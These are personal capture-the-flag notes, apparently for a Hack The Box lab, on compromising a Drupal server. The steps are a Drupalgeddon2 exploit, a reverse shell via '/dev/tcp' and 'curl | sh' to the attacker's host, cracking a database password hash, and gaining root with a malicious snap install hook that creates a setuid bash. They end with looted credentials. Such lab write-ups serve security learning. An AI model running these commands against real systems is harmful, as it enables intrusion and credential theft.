# Enumeration 
10.129.48.89
## open ports

```
port 80
port 22
```


# Foothold 
![[Pasted image 20230302231552.png]]
It's a drupal website

![[Pasted image 20230302231655.png]]
![[Pasted image 20230302231903.png]]
looking into searchsploit
![[Pasted image 20230302232045.png]]
change url in the script
![[Pasted image 20230302232130.png]]
failed to confirm rest_endpoint so exploit won't work
found inside /scripts
![[Pasted image 20230302232740.png]]
trying other exploit
[drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)
![[Pasted image 20230302234744.png]]

downloading some dependencies 
![[Pasted image 20230302234759.png]]
![[Pasted image 20230302234813.png]]
`sudo gem install require`
`sudo gem install highline`
![[Pasted image 20230302234857.png]]
and it worked
![[Pasted image 20230302234925.png]]
we got semi shell but we can get a better one using the uploaded shell
hosting a file that has a rev shell and executing it

```
bash -i >& /dev/tcp/10.10.16.12/443 0>&1 > shell.sh
curl http://10.10.16.12/shell.sh | sh
```

![[Pasted image 20230303005427.png]]

![[Pasted image 20230303005341.png]]
![[Pasted image 20230303005445.png]]
# Privesc 

## Apache -> brucetherealadmin

![[Pasted image 20230303005557.png]]

looking into website directories to find a config file 
found password in 
/var/www/html/sites/default/settings.php

![[Pasted image 20230303032434.png]]
![[Pasted image 20230303032701.png]]
cos shell is broken it will be painful to extract info but still worth trying
i have to spawn an error to crash sql and get the output
![[Pasted image 20230303032939.png]]
![[Pasted image 20230303033231.png]]
` .\hashcat.exe -m 7900 .\hash.txt .\rockyou.txt -O`
cracked!
## brucetherealadmin -> root
login failed
![[Pasted image 20230303033521.png]]
ssh worked
![[Pasted image 20230303033546.png]]
![[Pasted image 20230303033613.png]]
user can run sudo using snap install
inside [GTFObins](https://gtfobins.github.io/gtfobins/snap/)
![[Pasted image 20230303034020.png]]

created the package on my machine
![[Pasted image 20230303034152.png]]
sending .snap file to target
then ran sudo snap install ourfile.snap
![[Pasted image 20230303043254.png]]
now let's change COMMAND to something else
trying to set /bin/bash as a setuid but getting error
![[Pasted image 20230303043058.png]]
copying bash to other file and try to give it setuid and worked
```
COMMAND='chown root:root /home/brucetherealadmin/bash; chmod 4755 /home/brucetherealadmin/bash'
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

# On target
cp /bin/bash .
curl http://10.10.16.12/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```
![[Pasted image 20230303045324.png]]
# Loot
database 
	username: `drupaluser`
	password: `CQHEy@9M*m23gBVj`

brucetherealadmin user 
	username: `brucetherealadmin`
	password: `booboo`

---
Tags: #ctf
	Resources: [Seal](https://app.hackthebox.com/machines/358)